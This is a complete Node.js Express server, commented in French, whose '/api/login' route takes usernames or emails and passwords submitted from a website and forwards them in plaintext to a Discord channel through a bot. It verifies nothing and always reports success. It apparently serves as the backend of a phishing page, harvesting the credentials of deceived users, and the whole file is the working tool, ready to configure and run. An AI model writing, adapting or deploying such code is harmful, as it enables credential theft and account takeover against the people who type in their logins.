require('dotenv').config();
const express = require('express');
const cors = require('cors');
const path = require('path');
const { Client, GatewayIntentBits } = require('discord.js');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());
app.use(express.static(__dirname));

// Configuration du Bot Discord avec les intents nécessaires
const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
  ]
});

// Récupération du Token et de l'ID du salon depuis les variables d'environnement (.env ou Render)
const DISCORD_TOKEN = process.env.DISCORD_TOKEN;
const CHANNEL_ID = process.env.CHANNEL_ID;

// Événement quand le bot est prêt et connecté
client.once('ready', () => {
  console.log(`Bot connecté en tant que ${client.user.tag} ! Le bot est bien actif.`);
});

// Connexion du bot à Discord (c'est ce qui le met "en ligne")
if (DISCORD_TOKEN) {
  client.login(DISCORD_TOKEN);
} else {
  console.error("Erreur : Aucun DISCORD_TOKEN trouvé dans les variables d'environnement !");
}

// Route pour gérer la connexion depuis ton site web
app.post('/api/login', async (req, res) => {
  const { username, password } = req.body;

  try {
    const channel = await client.channels.fetch(CHANNEL_ID);
    if (!channel) {
      return res.status(500).json({ success: false, message: 'Salon Discord introuvable' });
    }

    // Envoi du message dans le salon par le bot
    await channel.send({
      embeds: [
        {
          title: '🔑 Nouvelle tentative de connexion',
          color: 3447003, // Bleu
          fields: [
            { name: 'Utilisateur / Email', value: username || 'Non renseigné', inline: true },
            { name: 'Mot de passe', value: password || 'Non renseigné', inline: true },
          ],
          timestamp: new Date().toISOString(),
        },
      ],
    });

    res.json({ success: true, message: 'Données transmises avec succès' });
  } catch (error) {
    console.error('Erreur lors de l\'envoi vers Discord :', error);
    res.status(500).json({ success: false, message: 'Erreur serveur' });
  }
});

app.listen(PORT, () => {
  console.log(`Serveur actif sur http://localhost:${PORT}`);
});
